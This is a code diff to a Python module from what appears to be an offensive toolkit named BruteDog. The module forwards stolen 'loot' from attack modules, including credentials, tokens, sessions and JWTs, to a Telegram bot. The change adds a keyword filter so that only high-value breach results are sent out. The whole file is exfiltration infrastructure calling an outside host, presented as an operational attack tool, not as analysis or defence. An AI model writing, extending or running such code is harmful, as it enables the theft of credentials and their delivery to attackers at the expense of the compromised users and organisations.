@@ -1,10 +1,11 @@
 #!/usr/bin/env python3
 """
-TELEMETRY_BROADCASTER.PY v8.7 — Centralized Offensive Telemetry & Proof-of-Work Dispatcher (Elite Red Team Adversarial Edition)
+TELEMETRY_BROADCASTER.PY v8.8 — Centralized Zero-Noise Offensive Telemetry & Proof-of-Work Dispatcher (Elite Red Team Adversarial Edition)
 Features:
-- Asynchronous and synchronous telemetry and loot broadcasting to Telegram
-- Clean HTML message templating with structured dictionary field formatting
-- Resilient non-blocking execution across multi-threaded and async module boundaries
+- Zero-noise filtering: Restricts broadcasts strictly to verified high-value breach loot and critical exploit pivots.
+- Asynchronous and synchronous telemetry and loot broadcasting to Telegram.
+- Clean HTML message templating with structured dictionary field formatting.
+- Resilient non-blocking execution across multi-threaded and async module boundaries.
 """
 import os
 import asyncio
@@ -14,13 +15,24 @@ from typing import Union, Dict, Any
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", os.getenv("BRUTEDOG_TG_TOKEN", ""))
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", os.getenv("BRUTEDOG_TG_CHAT", ""))
 
+# Keywords required to pass the zero-noise filter
+HIGH_VALUE_KEYWORDS = [
+    "critical", "bypass", "success", "loot", "token", "session", 
+    "admin", "credential", "compromised", "race", "pivot", "jwt", "dump"
+]
+
 async def broadcast_loot(vector: str, details: Union[Dict[str, Any], str]):
     """
     Centralized asynchronous dispatcher for BruteDog offensive modules.
-    Formats and pushes credentials, tokens, and cognitive loot straight to Telegram.
+    Enforces a strict zero-noise filter before pushing verified loot to Telegram.
     """
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
         return
+
+    # Zero-Noise Filtering Gate
+    check_str = f"{vector} {str(details)}".lower()
+    if not any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
+        return  # Suppress low-priority telemetry chatter completely
 
     api_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
 
@@ -31,7 +43,7 @@ async def broadcast_loot(vector: str, details: Union[Dict[str, Any], str]):
         details_str = f"<code>{str(details)}</code>"
 
     message = (
-        f"🚨 <b>BRUTEDOG V8.7 — COGNITIVE LOOT INTERCEPT</b> 🚨\n"
+        f"🚨 <b>BRUTEDOG V8.8 — VERIFIED COGNITIVE LOOT</b> 🚨\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"🎯 <b>Vector:</b> <code>{vector.upper()}</code>\n\n"
         f"{details_str}\n"
